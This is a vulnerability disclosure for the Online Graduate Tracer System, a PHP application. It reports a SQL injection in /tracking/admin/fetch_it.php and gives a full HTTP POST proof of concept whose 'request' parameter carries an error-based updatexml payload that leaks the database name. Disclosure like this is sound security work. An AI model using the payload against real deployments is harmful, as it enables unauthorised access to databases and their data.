## Online Graduate Tracer System has sql injection vulnerability

## submitter
zhangMingMing

## supplier
https://www.sourcecodester.com/php/15904/online-graduate-tracer-system-college-ict-alumni.html

## Vulnerability file
/tracking/admin/fetch_it.php

## Vulnerability analysis
<img width="1095" alt="image" src="https://github.com/user-attachments/assets/6d56b6c7-ca31-4ca0-8d92-d7079a84b600">

## describe
There is an unrestricted SQL injection attack in the Online Graduate Tracer System, and the controllable parameter is request. An attacker can obtain sensitive server information through this vulnerability.

POC
```
POST /tracking/admin/fetch_it.php?http:%2f%2flocalhost%2ftracking%2fadmin%2ffetch_it.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 83
Origin: http://localhost
Connection: close
Referer: http://localhost/tracking/admin/fetch_it.php?http:%2f%2flocalhost%2ftracking%2fadmin%2ffetch_it.php
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Pragma: no-cache
Cache-Control: no-cache

request=1%27+and+updatexml%281%2Cconcat%280x7e%2C%28database%28%29%29%29%2C3%29--+q
```
<img width="1261" alt="image" src="https://github.com/user-attachments/assets/d556f6f8-a4ef-4378-87a2-b18f66e56720">







